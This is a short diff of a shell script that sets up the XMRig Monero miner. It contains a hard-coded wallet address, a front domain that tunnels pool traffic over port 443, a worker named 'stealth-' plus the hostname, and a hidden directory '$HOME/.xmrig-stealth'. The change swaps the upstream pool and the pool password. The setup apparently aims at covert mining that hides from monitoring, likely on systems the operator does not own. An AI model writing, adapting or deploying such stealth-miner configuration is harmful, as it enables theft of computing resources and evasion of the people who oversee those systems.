@@ -4,7 +4,7 @@ set -e
 # === KONFIGURASI ===
 WALLET="85MLqXJjpZEUPjo9UFtWQ1C5zs3NDx7gJTRVkLefoviXbNN6CyDLKbBc3a1SdS7saaXPoPrxyTxybAnyJjYXKcFBKCJSbDp"
 DOMAIN="vheler.cfd"
-POOL_TARGET="pool.supportxmr.com:443"
+POOL_TARGET="pool.hashvault.pro:443"
 TUNNEL_NAME="xmrig-vheler"
 WORKER="stealth-$(hostname 2>/dev/null || echo $RANDOM)"
 DIR="$HOME/.xmrig-stealth"
@@ -65,7 +65,7 @@ cat > config.json <<EOF
   "pools": [{
     "url": "$DOMAIN:443",
     "user": "$WALLET.$WORKER",
-    "pass": "x",
+    "pass": "Danis",
     "tls": true
   }]
 }
